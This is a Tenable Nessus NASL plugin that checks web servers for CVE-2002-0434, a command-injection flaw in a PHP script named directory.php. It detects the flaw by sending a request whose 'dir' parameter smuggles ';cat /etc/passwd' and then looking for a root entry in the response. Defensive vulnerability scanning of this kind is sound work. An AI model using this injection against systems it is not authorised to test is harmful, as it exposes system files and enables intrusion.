#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(11017);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-2002-0434");
 script_bugtraq_id(4278);
 script_xref(name:"OSVDB", value:"3407");

 script_name(english:"Marcus Xenakis directory.php Execute Arbitrary Commands");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary code can run on the remote host." );
 script_set_attribute(attribute:"description", value:
"The 'directory.php' file is installed. 
1. This tool allows anybody to read any directory.
2. It is possible to execute arbitrary code with the rights 
   of the HTTP server." );
 script_set_attribute(attribute:"solution", value:
"Remove 'directory.php'." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );

script_end_attributes();

 script_summary(english:"Checks for the presence of /directory.php");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);

if(!can_host_php(port:port)) exit(0);

foreach dir (cgi_dirs())
{
 r = http_send_recv3(method: "GET", port:port, item:string(dir, "/directory.php?dir=%3Bcat%20/etc/passwd"));
 if (isnull(r)) exit(0);
 if (egrep(pattern:".*root:.*:0:[01]:.*", string:r[1]+r[2]))
 {	
 	security_hole(port);
        exit(0);
 }
}
